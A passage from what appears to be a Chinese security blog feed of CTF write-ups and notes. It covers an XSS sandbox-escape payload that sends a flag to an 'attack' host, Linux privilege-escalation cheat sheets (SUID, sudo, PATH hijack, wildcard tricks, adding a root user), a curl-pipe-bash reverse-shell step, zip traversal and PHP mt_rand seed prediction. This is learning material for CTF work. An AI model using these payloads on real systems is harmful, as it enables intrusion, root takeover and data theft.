payload.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[^\S ]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;index&quot;</span>, &#123; payload &#125;);<br>  &#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/visit&quot;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> payload = req.<span class="hljs-property">body</span>.<span class="hljs-property">payload</span><br>    <span class="hljs-keyword">if</span> (!payload)<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Missing payload&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> payload !== <span class="hljs-string">&quot;string&quot;</span>)<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Bad request&quot;</span>)<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">let</span> result = <span class="hljs-keyword">await</span> bot.<span class="hljs-title function_">visit</span>(payload)<br>        res.<span class="hljs-title function_">send</span>(result)<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err)<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;An error occurred&quot;</span>)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server running on port <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>阅读源码，大概是要提交一个payload给&#x2F;visit路由，触发bot去访问拿到flag</p><p>但是FLAG被放在了影子树里面，而且是封闭式的，手段非常有限</p><p>最后还是不会，艹</p><p>查找资料链接：</p><p><a href="https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md">https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md</a></p><p><a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</a></p><p><a href="https://blog.ankursundara.com/shadow-dom/">https://blog.ankursundara.com/shadow-dom/</a></p><p>发现国外已经有了研究</p><p>首先我们要获取flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">find</span>(<span class="hljs-string">&#x27;TRX&#x27;</span>);<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">execCommand</span>(<span class="hljs-string">&#x27;SelectAll&#x27;</span>)<br></code></pre></td></tr></table></figure><p>然后拿flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag=<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>().<span class="hljs-title function_">toString</span>()<br></code></pre></td></tr></table></figure><p>但是要带出flag，因为有csp，只能通过跳转，而在sandbox中跳转是不被允许的，所以需要沙箱逃逸</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250225161914760.png" alt="image-20250225161914760"></p><p>注意到 <code>allow-scripts 和allow-same-origin</code>，是可以直接<code>window.parent.document.body.insertAdjacentHTML</code> 来修改<code>parent</code>页逃逸的，完整payload如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;window.find(&#x27;TRX&#x27;);document.execCommand(&#x27;SelectAll&#x27;);var flag=window.getSelection().toString();window.parent.document.body.insertAdjacentHTML(&#x27;beforeend&#x27;, `&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=http://attack:1234/?cookie=$&#123;encodeURIComponent(flag)&#125;&#x27;&gt;`);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="keeper"><a href="#keeper" class="headerlink" title="keeper"></a>keeper</h2>]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客日志</title>
    <link href="/2025/02/20/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%97/"/>
    <url>/2025/02/20/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<p>搭建一个小站(2024.11.12)</p><p>博客加入加密功能(2025.3.14)</p><p>博客加入评论功能(2025.3.20)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux提权</title>
    <link href="/2025/02/15/linux%E6%8F%90%E6%9D%83/"/>
    <url>/2025/02/15/linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p>SUID是一种特殊权限，设置了suid的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限，例如程序文件的属主是root，那么执行该程序的用户就将暂时获得root账户的权限。sgid与suid类似，只是执行程序时获得的是文件属组的权限。passwd这个命令程序的权限设置，它就是设置了suid权限的<br><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215203606988.png" alt="image-20250215203606988"></p><p>注意以下几点：</p><ul><li><p>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义.</p></li><li><p>命令执行者要对该程序文件拥有执行(x)权限.</p></li><li><p>命令执行者在执行该程序时获得该程序文件属主的身份.（利用点）</p></li><li><p>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</p></li></ul><h2 id="如何设置SUID"><a href="#如何设置SUID" class="headerlink" title="如何设置SUID"></a>如何设置SUID</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename 设置SUID位<br><span class="hljs-built_in">chmod</span> u-s filename 去掉SUID设置<br></code></pre></td></tr></table></figure><h2 id="常见的可以用来提权的命令"><a href="#常见的可以用来提权的命令" class="headerlink" title="常见的可以用来提权的命令"></a>常见的可以用来提权的命令</h2><p>如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br><span class="hljs-built_in">cp</span><br>awk<br><span class="hljs-built_in">mv</span><br></code></pre></td></tr></table></figure><h2 id="查找SUID权限"><a href="#查找SUID权限" class="headerlink" title="查找SUID权限"></a>查找SUID权限</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h2><p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用<br>SUID权限运行，则可以通过find执行的命令都将以root身份去运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> anyfile <span class="hljs-comment">#必须要有这个文件</span><br>find anyfile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \; <span class="hljs-comment">#执行任意命令</span><br>find . -<span class="hljs-built_in">exec</span> /bin/sh -p  <span class="hljs-comment">#通过-p开启root权限shell</span><br></code></pre></td></tr></table></figure><h2 id="bash提权"><a href="#bash提权" class="headerlink" title="bash提权"></a>bash提权</h2><p>bash命令是用来打开一个shell。同时它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过bash执行的命令都将以root身份去运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br></code></pre></td></tr></table></figure><p>开启root终端</p><h2 id="vim提权"><a href="#vim提权" class="headerlink" title="vim提权"></a>vim提权</h2><p>利用vim提权的思路是修改&#x2F;etc&#x2F;passwd文件和&#x2F;etc&#x2F;shadow，为自己添加一个有root权限的用户</p><p>1.利用vim添加账号</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/passwd 添加特权用户<br>添加：hacker:x:0:0::/home/hacker:/bin/bash<br>vim /etc/shadow 添加特权用户<br>hacker:$1$salt<span class="hljs-variable">$638tR8bROOvPnPklDQ9Vf</span>/:19103:0:99999:7::: 密码是123456<br>su hacker<br></code></pre></td></tr></table></figure></blockquote><p>2.利用vim打开交互shell</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -c <span class="hljs-string">&#x27;:py import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>通过-c运行代码，用过python打开root终端</p></blockquote><h2 id="python-python3提权"><a href="#python-python3提权" class="headerlink" title="python&#x2F;python3提权"></a>python&#x2F;python3提权</h2><p>通过<code>-c</code>执行命令打开终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="计划任务提权"><a href="#计划任务提权" class="headerlink" title="计划任务提权"></a>计划任务提权</h1><p>linux计划任务提权是因为权限配置不当，计划任务以root权限运行，低权限的用户可以修改计划任务的文件，从而被攻击者利用，导致提权，Linux计划任务命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -e 编辑计划任务<br>crontab -l 查看计划任务<br>crontab -r 删除目前的crontab<br></code></pre></td></tr></table></figure><p>计划任务的文件夹在<code> /etc/cron*</code>下</p><p>条件：</p><ul><li>计划任务的权限是777或者是suid</li></ul><p>提权方法：</p><ul><li>先查看是不是存在高权限的计划任务</li><li>追加命令放入文件内</li><li>外带出执行结果 反弹shell 写文件等</li></ul><h1 id="环境变量劫持提权"><a href="#环境变量劫持提权" class="headerlink" title="环境变量劫持提权"></a>环境变量劫持提权</h1><p>PATH是Linux和类Unix操作系统中的环境变量，当我们执行一个命令的时候shell会先检查命令是否是系统内部命令，如果不是则会再去检查此命令是否是一个应用程序，shell会试着从PATH中逐步查找命令，我们就增加环境变量让shell先找到我们的文件</p><p>条件：</p><ul><li>文件时suid权限，命令不是直接执行系统命令</li></ul><p>假如文件内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;cat /etc/shadow&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>是使用的是<code>cat</code>而不是<code>/bin/cat</code>如果这个文件的权限是suid那么我们就可以环境变量劫持</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\n/bin/bash&quot;</span> &gt; /tmp/cat <span class="hljs-comment">#写入我们的命令</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span>   <span class="hljs-comment">#给执行权限</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <span class="hljs-comment">#增加环境变量</span><br>执行原命令<br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>拿到权限</p><h1 id="SUDO提权"><a href="#SUDO提权" class="headerlink" title="SUDO提权"></a>SUDO提权</h1><p><a href="https://www.huangmj.com/17116743651246.html#12-sudo-dd">Linux提权之Sudo 70种提权方法</a></p><p>sudo是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如reboot，su等等。这样不仅减少了root用户的登录 和管理时间，同样也提高了安全性。sudo不是对shell的一个代替，它是面向每个命令的。</p><p>但是想获取哪些命令设置了无密码sudo，还是需要查看 cat &#x2F;etc&#x2F;sudoers 文件或者 sudo -l 命令，而这两条命令都需要一定权限或者知道当前用户密码 </p><p>提权的命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">一条命令提权的<br><span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br><span class="hljs-built_in">sudo</span> awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="hljs-built_in">sudo</span> xxd <span class="hljs-string">&quot;/etc/shadow&quot;</span> | xxd -r<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">env</span> /bin/sh<br><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="hljs-built_in">sudo</span> zip 2.zip 1.txt -T --unzip-command=<span class="hljs-string">&quot;sh -c /bin/sh&quot;</span><br><span class="hljs-built_in">sudo</span> sed -n <span class="hljs-string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> /etc/passwd<br><span class="hljs-built_in">sudo</span> find /etc/passwd -<span class="hljs-built_in">exec</span> /bin/sh \;<br>两条命令提权的<br><span class="hljs-built_in">sudo</span> git <span class="hljs-built_in">help</span> config<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> ftp<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> less /etc/hosts<br>!sh<br><span class="hljs-built_in">sudo</span> ed<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> man man<br>!/bin/sh<br></code></pre></td></tr></table></figure><h1 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h1><p>通配符：</p><figure class="highlight do"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs do"><span class="hljs-comment">* 代表任意数量的字符</span><br>? 字符代表单个字符<br>[] 匹配中括号中的任意单一字符 可以使用连字符-表示范围，比如[0-9]<br></code></pre></td></tr></table></figure><p>原理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3&quot;</span> &gt; --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>生成一个<code>--help</code>文件，如果我们直接<code>cat --help</code>会显示cat的帮助</p><p>但是我们执行<code>cat *</code>就会输出–help</p><p>用法：</p><p>对于高权限计划任务如果使用通配符，那么我们就可以构造特殊的文件名，打到用高权限执行命令</p><p>例题：</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>这个题目，呜呜呜，刚进去完全不知道要干嘛，第一次看源码也没翻到最下面，浅浅的翻了一下，第二天再看的时候才再最下面找到</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>我们直接再上传<code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>成功拿到shell</p><p>查看根目录发现有flag，但是权限不够</p><p>尝试suid提权但是没有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>看一下<code>ps -ef</code>看看执行了什么</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>发先执行了<code>/start.sh</code>和<code>backup.sh</code></p><p>start没有权限看不了，那就看backup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>发现他会一直执行，刚开始的思路是环境变量劫持sleep函数让他执行<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>再<code>export PATH=/tmp:$PATH</code>再创建一个<code>/tmp/sleep</code>为<code>cat /flag &gt; /var/www/html/backup/1</code>给权限</p><p>我自己尝试会执行<code>/tem/sleep</code>但由于没有权限就是空文件，但是backp.sh不会执行这个文件，不知道为什么</p><p>后来发现<code>backup.sh</code>使用了通配符<code>*</code>那我们是不是可以再文件名上下手</p><p>刚刚好cp有一个参数<code>-H</code>可以让软链接也被复制</p><p>那么就可以实现</p><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  不是常规文件名不可以用<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>然后等一会发现<code>/backup</code>文件夹中有1</p><p>再读取1拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zip文件逃逸漏洞</title>
    <link href="/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="zip文件目录穿越"><a href="#zip文件目录穿越" class="headerlink" title="zip文件目录穿越"></a>zip文件目录穿越</h1><p>目录结构：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">├── /app                               <br>│   ├── /app.py                         <br>│   ├── /uploads                       <br>│   ├── /templates                   <br>│   └── /.config <br>│── home<br></code></pre></td></tr></table></figure><p>我们上传文件的目录在<code>uploads</code>，我们想要覆盖app.py，那解释<code>../app.py</code></p><p>我们把要覆盖的文件打包成压缩包，压缩包名字写成<code>..1app.py</code></p><p>然后把文件用<code>notepad++</code>打开把<code>1</code>改成<code>/</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215202207812.png" alt="image-20250215202207812"></p><p>有两处都要改</p><h1 id="软链接打包"><a href="#软链接打包" class="headerlink" title="软链接打包"></a>软链接打包</h1><p>文件软链接到&#x2F;etc&#x2F;passwd等文件，达到任意文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /etc/passwd ./a   <span class="hljs-comment">#文件/etc/pawwsd软链接到a</span><br>zip --symlinks -r 1.zip ./a  <span class="hljs-comment">#将a文件压缩为1.zip</span><br></code></pre></td></tr></table></figure><p>解释：</p><blockquote><h3 id="symlinks："><a href="#symlinks：" class="headerlink" title="--symlinks："></a><code>--symlinks</code>：</h3><p>这个选项告诉 <code>zip</code> 在压缩符号链接（symlink）时，要保留其符号链接特性，而不是将它们转换成链接目标文件的实际内容</p></blockquote><p>这个仅适合哪些文件展示界面适用</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>zip文件逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪随机数</title>
    <link href="/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    <url>/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="mt-rand-存在的问题"><a href="#mt-rand-存在的问题" class="headerlink" title="mt_rand()存在的问题"></a><strong>mt_rand()存在的问题</strong></h1><p>mt_rand()如何生成的随机整数，它与设置的seed值和调用该函数的次数有关，假设使用mt_srand(12345)进行了一次播种，那么第一次调用mt_rand生成的数值为a，第二次为b，第三次为c。所以当有人拿到与你一串一模一样的seed时，所执行的结果都是跟刚刚描述的一样，这样就可以预测出接下来的数值是多少<br>验证：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为123时生成的伪随机数列：\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">11111111</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为11111111时生成的伪随机数列:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为123时生成的伪随机数列:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为123时生成的伪随机数列：\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns">当rand值为<span class="hljs-number">123</span>时生成的伪随机数列：<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>当rand值为<span class="hljs-number">11111111</span>时生成的伪随机数列:<br><span class="hljs-number">1275140870</span><br><span class="hljs-number">304669862</span><br><span class="hljs-number">188245067</span><br><span class="hljs-number">1742075826</span><br><span class="hljs-number">1668666189</span><br>当rand值为<span class="hljs-number">123</span>时生成的伪随机数列:<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>当rand值为<span class="hljs-number">123</span>时生成的伪随机数列：<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br></code></pre></td></tr></table></figure><p>发现对于一个种子，题目随机数生成的是一样的</p><h1 id="php-mt-seed4-0工具"><a href="#php-mt-seed4-0工具" class="headerlink" title="php_mt_seed4.0工具"></a>php_mt_seed4.0工具</h1><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/openwall/php_mt_seed<br><span class="hljs-built_in">cd</span> php_mt_seed<br>make<br></code></pre></td></tr></table></figure><p>运行方法：</p><blockquote><p>time 开头，使用 .&#x2F; 执行我们的程序，后面再接上希望逆推的随机数字节</p></blockquote><p>随机数转字节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">php_mt_seed</span>(<span class="hljs-params"><span class="hljs-variable">$dict</span></span>) </span>&#123;<br>    <span 